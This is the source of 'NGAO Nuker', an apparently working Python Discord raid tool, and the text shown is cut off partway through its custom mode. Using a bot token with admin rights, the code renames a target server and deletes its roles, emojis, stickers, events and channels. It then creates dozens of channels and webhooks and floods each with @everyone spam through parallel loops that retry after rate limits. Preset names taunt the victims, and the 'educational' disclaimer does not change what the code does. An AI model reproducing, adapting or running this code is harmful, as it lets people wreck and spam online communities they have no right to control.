# ============================= LICENSE ============================
#
#   NGAO Nuker - Licence d’Utilisation / License of Use
#   Copyright (c) 2025 RyzenGT
#
#   - FRANCAIS :
#   Ce logiciel est fourni exclusivement à des fins éducatives et de divertissement.
#   Il est interdit de le revendre, distribuer, modifier ou utiliser sans l’accord écrit de RyzenGT.
#   Il est interdit de l’utiliser à des fins malveillantes ou pour nuire à autrui.
#   L’auteur décline toute responsabilité quant à l’utilisation du logiciel.
#
#   - ENGLISH :
#   This software is provided exclusively for educational and entertainment purposes.
#   It is forbidden to resell, distribute, modify or use without the written consent of RyzenGT.
#   It is forbidden to use this software for malicious purposes or to harm others.
#   The author disclaims all liability for the use of the software.
#
#   Contact : kng.sgao ( On Discord )
#
# ========================= Ensure Imports =========================

import subprocess
import sys

def EnsureImports():
    required_modules = [
        "os",
        "time",
        "sys",
        "requests",
        "random",
        "string",
        "asyncio",
        "json",
        "discord",
        "datetime",
        "logging",
        "colorama",
    ]
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", module])


EnsureImports()

# ========================= Modules =========================

import os
import time
import sys
import requests
import random
import string
import asyncio
import json
import logging
import discord
from discord import *
from datetime import datetime
from colorama import *

# ========================= Configuration (.json) =========================


def GenerateUserID():
    if "User-Config" not in Config:
        Config["User-Config"] = {}

    if Config["User-Config"].get("UserId"):
        return Config["User-Config"]["UserId"]

    part1 = "".join(random.choices(string.digits, k=4))
    part2 = "".join(random.choices(string.digits, k=3)) + random.choice(
        string.ascii_letters
    )
    part3 = "".join(random.choices(string.digits, k=4))

    user_id = f"{part1}-NGAO-{part2}-{part3}"

    Config["User-Config"]["UserId"] = user_id
    SaveConfig(Config)

    return user_id


def LoadConfig():
    config_file = "Configuration.json"
    if os.path.exists(config_file):
        with open(config_file, "r") as f:
            return json.load(f)
    else:
        return {
            "User-Config": {"FirstRun": "Yes", "UserId": "", "BotToken": ""},
            "Preset-Nuker1": {
                "ServerName": "Nuked By NGAO Nuker",
                "ChannelsTextName": "nuked-by-ngao-nuker",
                "ChannelsTextAmount": "30",
                "ChannelsVocName": "Nuked By NGAO-Nuker",
                "ChannelsVocAmount": "70",
                "Message": "## Nuked By [NGAO-Nuker](https://github.com/RyzenGT/NGAO-Nuker) Tool @everyone @here",
                "AdminRoleToEveryone": "Yes",
                "DelExistingChannels": "Yes",
                "DeleteRoles": "Yes",
                "DeleteEmojis": "Yes",
                "DeleteStickers": "Yes",
                "DeleteSoundboards": "Yes",
            },
            "Preset-Nuker2": {
                "ServerName": "Fucked by NGAO Nuker",
                "ChannelsTextName": "fucked-by-ngao-nuker",
                "ChannelsTextAmount": "40",
                "ChannelsVocName": "Fucked By NGAO-Nuker",
                "ChannelsVocAmount": "60",
                "Message": "## Fucked By [NGAO-Nuker](https://github.com/RyzenGT/NGAO-Nuker) Tool @everyone @here | So EZ ",
                "AdminRoleToEveryone": "Yes",
                "DelExistingChannels": "Yes",
                "DeleteRoles": "Yes",
                "DeleteEmojis": "No",
                "DeleteStickers": "No",
                "DeleteSoundboards": "No",
            },
            "Preset-Nuker3": {
                "ServerName": "NGAO Nuker On Top",
                "ChannelsTextName": "ngao-nuker-on-top",
                "ChannelsTextAmount": "40",
                "ChannelsVocName": "NGAO Nuker On Top",
                "ChannelsVocAmount": "60",
                "Message": "## [NGAO-Nuker](https://github.com/RyzenGT/NGAO-Nuker) On Top @everyone @here | Best Nuker Tool ",
                "AdminRoleToEveryone": "No",
                "DelExistingChannels": "Yes",
                "DeleteRoles": "No",
                "DeleteEmojis": "No",
                "DeleteStickers": "No",
                "DeleteSoundboards": "No",
            },
            "Custom-Nuker": {
                "ServerName": "",
                "ChannelsTextName": "",
                "ChannelsTextAmount": "",
                "ChannelsVocName": "",
                "ChannelsVocAmount": "",
                "WebhookName": "",
                "Message": "",
                "AdminRoleToEveryone": "",
                "DelExistingChannels": "",
                "DeleteRoles": "",
                "DeleteEmojis": "",
                "DeleteStickers": "",
                "DeleteSoundboards": "",
            },
        }


def SaveConfig(Config):
    config_file = "Configuration.json"
    with open(config_file, "w") as f:
        json.dump(Config, f, indent=4)


Config = LoadConfig()

if not Config.get("User-Config", {}).get("UserId"):
    GenerateUserID()

# ========================= Utilities =========================


def CurrentLocalTime():
    return datetime.now().strftime("%H:%M:%S")


reset = Fore.RESET
white = Fore.WHITE
green = Fore.GREEN
yellow = Fore.YELLOW
red = Fore.RED

start = f"{red}[{white}"
end = f"{red}]"

SUCCESS = lambda: f"{start + CurrentLocalTime() + end} {start}+{end}{white}"
FAILED = lambda: f"{start + CurrentLocalTime() + end} {start}x{end}{white}"
ERROR = lambda: f"{start + CurrentLocalTime() + end} {start}!{end}{white}"
LOADING = lambda: f"{start + CurrentLocalTime() + end} {start}~{end}{white}"
INPUT = lambda: f"{start + CurrentLocalTime() + end} {start}>{end}{white}"
INFORMATION = lambda: f"{start + CurrentLocalTime() + end} {start}?{end}{white}"
CHOICE = lambda: f"{start + CurrentLocalTime() + end} {start}#{end}{white}"


def Clear():
    os.system("cls")


def SetTitle(text):
    os.system(f"title NGAO Nuker V2.0 / {text}")


def CheckToken(token_bot):
    token = token_bot.strip()
    url = "https://discord.com/api/v9/users/@me"
    headers = {"Authorization": f"Bot {token}"}

    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            Config["User-Config"]["BotToken"] = token
            SaveConfig(Config)
            return True
        elif response.status_code == 401:
            print(f"{FAILED()} Invalid token, please try again.{reset}")
            time.sleep(1)
            NgaoNukerMenu()
        else:
            print(f"{ERROR()} Unexpected Error ({response.status_code}).{reset}")
            time.sleep(1)
            NgaoNukerMenu()
    except requests.exceptions.RequestException as e:
        print(f"{ERROR()} Request failed:{white} {e}")
        time.sleep(1)
        NgaoNukerMenu()


def UpdateToken(token):
    Config["User-Config"]["BotToken"] = token
    SaveConfig(Config)


def AskForToken():
    global Config
    OldTokenMain = Config.get("User-Config", {}).get("BotToken")

    if OldTokenMain:
        if CheckToken(OldTokenMain):
            Choice = TypeWriterInput(
                f"{INPUT()} Do You Want To Reuse The Old Token Used? (y/n) {red}->{reset} "
            )
            if Choice.lower() in ["y", "yes"]:
                return OldTokenMain
            elif Choice.lower() in ["n", "no"]:
                """"""
            else:
                InvalidChoice()
        else:
            print(
                f"{FAILED()} The Old Token Is No Longer Valid, please add the new token.{reset}"
            )
            OldTokenMain = None

    while True:
        NewToken = TypeWriterInput(f"{INPUT()} Insert Bot Token {red}->{reset} ")
        if CheckToken(NewToken):
            UpdateToken(NewToken)
            return NewToken
        else:
            print(f"{FAILED()} Invalid token, please try again.{reset}")
            time.sleep(1)
            NgaoNukerMenu()


def TypeWriterInput(text, delay=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    return input()


def TypeWriterPrint(text, delay=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    return print()


def Scroll(text):
    for line in text.split("\n"):
        print(line)
        time.sleep(0.04)


time.sleep(0.5)


def ScrollGradient(text):
    for line in Gradient(text).split("\n"):
        print(line)
        time.sleep(0.04)


time.sleep(0.5)


def Gradient(text):
    start_color = (223, 5, 5)
    end_color = (121, 3, 3)

    num_steps = 15

    colors = []
    for i in range(num_steps):
        r = start_color[0] + (end_color[0] - start_color[0]) * i // (num_steps - 1)
        g = start_color[1] + (end_color[1] - start_color[1]) * i // (num_steps - 1)
        b = start_color[2] + (end_color[2] - start_color[2]) * i // (num_steps - 1)
        colors.append((r, g, b))

    colors += list(reversed(colors[:-1]))

    fancy_chars = "▄█╔╗║╚╝═╠╣╩╦└┌─@%░▒▓"

    def color_text(r, g, b, char):
        return f"\033[38;2;{r};{g};{b}m{char}"

    lines = text.split("\n")
    result = []

    for i, line in enumerate(lines):
        for j, char in enumerate(line):
            if char in fancy_chars:
                color = colors[(i + j) % len(colors)]
                result.append(color_text(*color, char))
            else:
                result.append(char)
        result.append("\033[0m\n")

    return "".join(result)


def InvalidChoice():
    print(f"{FAILED()} Invalid choice, please try again.")
    time.sleep(1)
    NgaoNukerMenu()


# ========================= Hide logs =========================

logging.getLogger("discord").setLevel(logging.WARNING)
logging.getLogger("discord.gateway").setLevel(logging.WARNING)
logging.getLogger("discord.client").setLevel(logging.WARNING)

# ========================= Help Menu =========================


def HelpMenu():
    SetTitle("Help Menu")
    Clear()
    HelpText = f"""
                       ██╗  ██╗███████╗██╗     ██████╗     ███╗   ███╗███████╗███╗   ██╗██╗   ██╗
                       ██║  ██║██╔════╝██║     ██╔══██╗    ████╗ ████║██╔════╝████╗  ██║██║   ██║
                       ███████║█████╗  ██║     ██████╔╝    ██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║
                       ██╔══██║██╔══╝  ██║     ██╔═══╝     ██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║
                       ██║  ██║███████╗███████╗██║         ██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
                       ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝         ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ 

{start}?{end}{white} User ID {red}->{white} {GenerateUserID()}{reset} 
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                    {white}V2.0 {red}// {white}github.com/RyzenGT/NGAO-Nuker {red}// {white}Made By RyzenGT {red}// {white}Discord Nuker Tool{reset}                    ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║                                                                                                                      ║
║     {white}Preset Nuker        {red}:{white} Launches fast nuke with predefined settings.{reset}                                               ║
║     {white}Custom Nuker        {red}:{white} Launches a customizable nuke with user-defined settings.{reset}                                   ║
║     {white}Advanced Menu       {red}:{white} Access to advanced functions.{reset}                                                              ║
║     {white}Token Bot           {red}:{white} Requires a Discord bot token with admin permissions.{reset}                                       ║
║     {white}Security            {red}:{white} Use a test server, never use it on a server without permission.{reset}                            ║
║     {white}Configuration File  {red}:{white} The settings are saved in 'Configuration.json'.{reset}                                            ║
║     {white}Support             {red}:{white} Send me a DM on Discord -> RyzenGT{reset}                                                         ║
║                                                                                                                      ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"""
    ScrollGradient(HelpText)
    TypeWriterInput(f"{INPUT()} Press Enter To Return To The Main Menu {red}->{reset} ")
    time.sleep(1)
    NgaoNukerMenu()


# ========================= Preset Nuker =========================


def PresetNuker():
    SetTitle("Preset Nuker")
    Clear()
    PresetNuker = f"""
            ██████╗ ██████╗ ███████╗███████╗███████╗████████╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
            ██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝╚══██╔══╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
            ██████╔╝██████╔╝█████╗  ███████╗█████╗     ██║       ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
            ██╔═══╝ ██╔══██╗██╔══╝  ╚════██║██╔══╝     ██║       ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
            ██║     ██║  ██║███████╗███████║███████╗   ██║       ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
            ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝   ╚═╝       ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

{start}?{end}{white} User ID {red}->{white} {GenerateUserID()}{reset} 
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                    {white}V2.0 {red}// {white}github.com/RyzenGT/NGAO-Nuker {red}// {white}Made By RyzenGT {red}// {white}Discord Nuker Tool{reset}                    ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"""
    ScrollGradient(PresetNuker)
    ScriptPresetNuker()


# ========================= Script Preset Nuker =========================


def ScriptPresetNuker():

    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ")

    if not GuildId:
        print(f"{FAILED()} Please Enter A Valid Guild ID.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()

    try:
        GuildInput = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Please Enter A Valid Guild ID.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()
    TypeWriterInput(f"{INPUT()} Press To Nuke {red}->{reset} ")
    print(f"{LOADING()} Starting The Nuker..")
    time.sleep(random.randint(1, 2))

    batch_size = 10

    PresetKey = random.choice(["Preset-Nuker1", "Preset-Nuker2", "Preset-Nuker3"])
    Preset = Config[PresetKey]
    TokenBot = Config["User-Config"]["BotToken"]

    Intents = discord.Intents.all()
    Bot = discord.Client(intents=Intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")
        time.sleep(1)

        guild = discord.utils.get(Bot.guilds, id=int(GuildId))
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            Clear()
            NgaoNukerMenu()

        me = guild.me
        if not any(role.permissions.administrator for role in me.roles):
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            Clear()
            NgaoNukerMenu()

        try:
            await guild.edit(name=Preset.get("ServerName", "Error"))
            print(f"{SUCCESS()} Server name changed successfully.")
        except HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after if hasattr(e, "retry_after") else 5
                print(
                    f"{LOADING()} Rate limit reached. Please wait {retry_after}.{white}"
                )
                await asyncio.sleep(retry_after)

                try:
                    await guild.edit(name=Preset.get("ServerName", "Error"))
                    print(f"{SUCCESS()} Server name changed successfully.")
                except Exception as e2:
                    print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
            else:
                print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
        except Exception as e:
            print(f"{FAILED()} Unable to change server name {red}->{white} {e}{reset}")

        if Preset.get("DeleteRoles", "No") == "Yes":
            for role in guild.roles:
                if role not in me.roles and role != guild.default_role:
                    try:
                        await role.delete()
                        print(
                            f"{SUCCESS()} The role '{role.name}' has been successfully deleted.{reset}"
                        )
                    except HTTPException as e:
                        if e.status == 429:
                            retry_after = getattr(e, "retry_after", 5)
                            print(
                                f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                            )
                            await asyncio.sleep(retry_after)

                            try:
                                await role.delete()
                                print(
                                    f"{SUCCESS()} The role '{role.name}' has been successfully deleted.{reset}"
                                )
                            except Exception as e2:
                                print(
                                    f"{FAILED()} Retry failed {red}->{white} {e2}{reset}"
                                )
                        else:
                            print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
                    except Exception as e:
                        print(
                            f"{FAILED()} Unable to delete role '{role.name}' {red}->{white} {e}{reset}"
                        )

        if Preset.get("DeleteEmojis", "No") == "Yes":
            for emoji in guild.emojis:
                try:
                    await emoji.delete()
                    print(
                        f"{SUCCESS()} The emoji '{emoji.name}' has been successfully deleted.{reset}"
                    )
                except HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 5)
                        print(
                            f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                        )
                        await asyncio.sleep(retry_after)
                        try:
                            await emoji.delete()
                            print(
                                f"{SUCCESS()} The emoji '{emoji.name}' has been successfully deleted.{reset}"
                            )
                        except Exception as e2:
                            print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
                    else:
                        print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
                except Exception as e:
                    print(
                        f"{FAILED()} Unable to delete emoji '{emoji.name}' {red}->{white} {e}{reset}"
                    )

        if Preset.get("DeleteStickers", "No") == "Yes":
            for sticker in await guild.fetch_stickers():
                try:
                    await sticker.delete()
                    print(
                        f"{SUCCESS()} The sticker '{sticker.name}' has been successfully deleted.{reset}"
                    )
                except HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 5)
                        print(
                            f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                        )
                        await asyncio.sleep(retry_after)
                        try:
                            await sticker.delete()
                            print(
                                f"{SUCCESS()} The sticker '{sticker.name}' has been successfully deleted.{reset}"
                            )
                        except Exception as e2:
                            print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
                    else:
                        print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
                except Exception as e:
                    print(
                        f"{FAILED()} Unable to delete sticker '{sticker.name}' {red}->{white} {e}{reset}"
                    )

        if Preset.get("DeleteSoundboards", "No") == "Yes":
            for s in await guild.fetch_scheduled_events():
                try:
                    await s.delete()
                    print(
                        f"{SUCCESS()} The soundboard '{s.name}' has been successfully deleted.{reset}"
                    )
                except HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 5)
                        print(
                            f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                        )
                        await asyncio.sleep(retry_after)
                        try:
                            await s.delete()
                            print(
                                f"{SUCCESS()} The soundboard '{s.name}' has been successfully deleted.{reset}"
                            )
                        except Exception as e2:
                            print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
                    else:
                        print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
                except Exception as e:
                    print(
                        f"{FAILED()} Unable to delete soundboard '{s.name}' {red}->{white} {e}{reset}"
                    )

        if Preset.get("DelExistingChannels", "No") == "Yes":
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(
                        f"{SUCCESS()} The channel '{channel.name}' has been successfully deleted.{reset}"
                    )
                except HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 5)
                        print(
                            f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                        )
                        await asyncio.sleep(retry_after)
                        try:
                            await channel.delete()
                            print(
                                f"{SUCCESS()} The channel '{channel.name}' has been successfully deleted.{reset}"
                            )
                        except Exception as e2:
                            print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
                    else:
                        print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
                except Exception as e:
                    print(
                        f"{FAILED()} Unable to delete channel '{channel.name}' {red}->{white} {e}{reset}"
                    )

        channel_name = Preset.get("ChannelsTextName", "nuked-by-ngao-nuker")
        vchannel_name = Preset.get("ChannelVocName", "Nuked By NGAO Nuker")
        total = int(Preset.get("ChannelsTextAmount", "30"))
        vtotal = int(Preset.get("ChannelsVocAmount", "30"))
        message = Preset.get(
            "Message",
            "## Nuked By [NGAO-Nuker](https://github.com/RyzenGT/NGAO-Nuker) Tool @everyone @here",
        )

        created_channels = []

        async def CreateChannel(guild, name, index):
            try:
                ch = await guild.create_text_channel(name=name)
                created_channels.append(ch)
                print(
                    f"{SUCCESS()} Channel '{name}' has been successfully created.{reset}"
                )
                return ch
            except Exception as e:
                print(
                    f"{FAILED()} Unable to create channel '{name}' {red}->{white} {e}{reset}"
                )

        for batch_start in range(0, total, batch_size):
            batch_end = min(batch_start + batch_size, total)
            batch_tasks = []

            for i in range(batch_start, batch_end):
                ch_name = f"{channel_name}-{i+1}"
                task = CreateChannel(guild, ch_name, i)
                batch_tasks.append(task)

            results = await asyncio.gather(*batch_tasks)

            created_channels.extend([ch for ch in results if ch is not None])

        created_vchannels = []

        async def CreateVocChannel(guild, name, index):
            try:
                ch = await guild.create_voice_channel(name=name)
                created_vchannels.append(ch)
                print(
                    f"{SUCCESS()} Voice channel '{name}' has been successfully created.{reset}"
                )
                return ch
            except Exception as e:
                print(
                    f"{FAILED()} Unable to create voice channel '{name}' {red}->{white} {e}{reset}"
                )

        for batch_start in range(0, vtotal, batch_size):
            batch_end = min(batch_start + batch_size, vtotal)
            batch_tasks = []

            for i in range(batch_start, batch_end):
                ch_name = f"{vchannel_name}-{i+1}"
                task = CreateVocChannel(guild, ch_name, i)
                batch_tasks.append(task)

            results = await asyncio.gather(*batch_tasks)

            created_vchannels.extend([ch for ch in results if ch is not None])

        created_webhooks = []

        for channel in created_channels:
            try:
                webhook = await channel.create_webhook(name="NGAO Webhook")
                created_webhooks.append(webhook)
                print(
                    f"{SUCCESS()} Webhook '{webhook.name}' has been successfully created in '{channel.name}'.{reset}"
                )
                await asyncio.sleep(0.15)
            except HTTPException as e:
                if e.status == 429:
                    retry_after = getattr(e, "retry_after", 5)
                    print(
                        f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                    )
                    await asyncio.sleep(retry_after)
                    try:
                        webhook = await channel.create_webhook(name="NGAO Webhook")
                        created_webhooks.append(webhook)
                        print(
                            f"{SUCCESS()} Webhook '{webhook.name}' has been successfully created in '{channel.name}'.{reset}"
                        )
                        await asyncio.sleep(0.2)
                    except Exception as e2:
                        print(
                            f"{FAILED()} Retry failed for webhook in '{channel.name}' {red}->{white} {e2}{reset}"
                        )
                else:
                    print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
            except Exception as e:
                print(
                    f"{FAILED()} Unable to create webhook in '{channel.name}' {red}->{white} {e}{reset}"
                )

        async def spam_webhook(webhook, message, times):
            for _ in range(times):
                try:
                    await webhook.send(content=message, username="NGAO Webhook")
                    print(
                        f"{SUCCESS()} Webhook '{webhook.name}' sent the message successfully."
                    )
                except Exception as e:
                    print(
                        f"{FAILED()} Webhook '{webhook.name}' failed to send message. {red}->{white} {e}{reset}"
                    )

        Msg = 120
        Parallel = 50

        tasks = []
        for webhook in created_webhooks:
            for _ in range(Parallel):
                tasks.append(spam_webhook(webhook, message, Msg))

        await asyncio.gather(*tasks)

        print(f"{INFORMATION()} Nuke Done, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        NgaoNukerMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        NgaoNukerMenu()


# ========================= Custom Nuker =========================


def CustomNuker():
    SetTitle("Custom Nuker")
    Clear()
    CustomNuker = f"""
          ██████╗██╗   ██╗███████╗████████╗ ██████╗ ███╗   ███╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
         ██╔════╝██║   ██║██╔════╝╚══██╔══╝██╔═══██╗████╗ ████║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
         ██║     ██║   ██║███████╗   ██║   ██║   ██║██╔████╔██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
         ██║     ██║   ██║╚════██║   ██║   ██║   ██║██║╚██╔╝██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
         ╚██████╗╚██████╔╝███████║   ██║   ╚██████╔╝██║ ╚═╝ ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
          ╚═════╝ ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{start}?{end}{white} User ID {red}->{white} {GenerateUserID()}{reset}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                    {white}V2.0 {red}// {white}github.com/RyzenGT/NGAO-Nuker {red}// {white}Made By RyzenGT {red}// {white}Discord Nuker Tool{reset}                    ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"""
    ScrollGradient(CustomNuker)
    ScriptCustomNuker()


# ========================= Script Custom Nuker =========================


def ScriptCustomNuker():
    TokenBot = Config["User-Config"]["BotToken"]

    cfg = Config["Custom-Nuker"]

    if all(not str(v).strip() for v in cfg.values()):
        OldConfig = False
    else:
        AskForConfig = (
            TypeWriterInput(
                f"{INPUT()} Do You Want To Use Your Old Configuration? (y/n) {red}->{reset} "
            )
            .strip()
            .lower()
        )
        if AskForConfig in ["y", "yes"]:
            OldConfig = True
        elif AskForConfig in ["n", "no"]:
            OldConfig = False
        else:
            InvalidChoice()

    if not OldConfig:
        ServerName = TypeWriterInput(f"{INPUT()} Server Name {red}->{reset} ").strip()
        if not ServerName:
            print(f"{FAILED()} Server name cannot be empty.{reset}")
            time.sleep(1)
            Clear()
            NgaoNukerMenu()

        CreateTextChannel = (
            TypeWriterInput(f"{INPUT()} Name Of Text Channels Created? {red}->{reset} ")
            .lower()
            .strip()
            .replace(" ", "-")
        )
        if not CreateTextChannel:
            print(f"{FAILED()} Text channel cannot be empty.{reset}")
            time.sleep(1)
            Clear()
            NgaoNukerMenu()

        CreateVcChannel = TypeWriterInput(
            f"{INPUT()} Name Of Voice Channels Created? {red}->{reset} "
        ).strip()
        if not CreateVcChannel:
            print(f"{FAILED()} Voice channel cannot be empty.{reset}")
            time.sleep(1)
            Clear()
            NgaoNukerMenu()

        NameWebhook = TypeWriterInput(f"{INPUT()} Webhook Name {red}->{reset} ").strip()
        if not NameWebhook:
            print(f"{FAILED()} Webhook name cannot be empty.{reset}")
            time.sleep(1)
            Clear()
            NgaoNukerMenu()

        ManyCreateTextChannel = int(
            TypeWriterInput(
                f"{INPUT()} How Many Text Channels Do You Want To Create? {red}->{reset} "
            )
        )
        if not ManyCreateTextChannel:
            print(f"{FAILED()} Please Enter A Valid Number.{reset}")
            time.sleep(1)
            Clear()
            NgaoNukerMenu()

        ManyCreateVocChannel = int(
            TypeWriterInput(
                f"{INPUT()} How Many Voice Channels Do You Want To Create? {red}->{reset} "
            )
        )
        if not ManyCreateVocChannel:
            print(f"{FAILED()} Please Enter A Valid Number.{reset}")
            time.sleep(1)
            Clear()
            NgaoNukerMenu()

        Message = TypeWriterInput(f"{INPUT()} Message To Spam {red}->{reset} ").strip()
        if not Message:
            print(f"{FAILED()} Message cannot be empty.{reset}")
            time.sleep(1)
            Clear()
            NgaoNukerMenu()

        GiveAdmin = (
            TypeWriterInput(
                f"{INPUT()} Give Everyone The Administrator Role ? (y/n) {red}->{reset} "
            )
            .lower()
            .strip()
        )
        DeleteChannel = (
            TypeWriterInput(
                f"{INPUT()} Delete All Existing Channels? (y/n) {red}->{reset} "
            )
            .lower()
            .strip()
        )
        DeleteRole = (
            TypeWriterInput(f"{INPUT()} Delete All Roles? (y/n) {red}->{reset} ")
            .lower()
            .strip()
        )
        DeleteEmoji = (
            TypeWriterInput(f"{INPUT()} Delete All Emojis? (y/n) {red}->{reset} ")
            .lower()
            .strip()
        )
        DeleteSticker = (
            TypeWriterInput(f"{INPUT()} Delete All Stickers? (y/n) {red}->{reset} ")
            .lower()
            .strip()
        )
        DeleteSoundboard = (
            TypeWriterInput(f"{INPUT()} Delete All Soundboards? (y/n) {red}->{reset} ")
            .lower()
            .strip()
        )
    else:
        ServerName = cfg["ServerName"]
        CreateTextChannel = cfg["ChannelsTextName"]
        ManyCreateTextChannel = int(cfg["ChannelsTextAmount"])
        CreateVcChannel = cfg["ChannelsVocName"]
        ManyCreateVocChannel = int(cfg["ChannelsVocAmount"])
        NameWebhook = cfg["WebhookName"]
        Message = cfg["Message"]
        GiveAdmin = cfg["AdminRoleToEveryone"]
        DeleteChannel = cfg["DelExistingChannels"]
        DeleteRole = cfg["DeleteRoles"]
        DeleteEmoji = cfg["DeleteEmojis"]
        DeleteSticker = cfg["DeleteStickers"]
        DeleteSoundboard = cfg["DeleteSoundboards"]

    try:
        GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()
        GuildInput = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Please Enter A Valid Guild ID.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()

    options = {
        "ServerName": ServerName,
        "ChannelsTextName": CreateTextChannel,
        "ChannelsTextAmount": ManyCreateTextChannel,
        "ChannelsVocName": CreateVcChannel,
        "ChannelsVocAmount": ManyCreateVocChannel,
        "WebhookName": NameWebhook,
        "Message": Message,
        "AdminRoleToEveryone": "Yes" if GiveAdmin in ["y", "yes"] else "No",
        "DelExistingChannels": "Yes" if DeleteChannel in ["y", "yes"] else "No",
        "DeleteRoles": "Yes" if DeleteRole in ["y", "yes"] else "No",
        "DeleteEmojis": "Yes" if DeleteEmoji in ["y", "yes"] else "No",
        "DeleteStickers": "Yes" if DeleteSticker in ["y", "yes"] else "No",
        "DeleteSoundboards": "Yes" if DeleteSoundboard in ["y", "yes"] else "No",
    }

    for key, value in options.items():
        Config["Custom-Nuker"][key] = value

    SaveConfig(Config)

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()
    print(f"{LOADING()} Creation Of The Nuker In Progress..{reset}")
    time.sleep(random.randint(4, 7))
    TypeWriterInput(f"{INPUT()} Press To Nuke {red}->{reset} ")
    print(f"{LOADING()} Starting The Nuker..")
    time.sleep(random.randint(1, 2))

    batch_size = 10

    Preset = Config["Custom-Nuker"]
    TokenBot = Config["User-Config"]["BotToken"]

    Intents = discord.Intents.all()
    Bot = discord.Client(intents=Intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")
        time.sleep(1)

        guild = discord.utils.get(Bot.guilds, id=GuildInput)
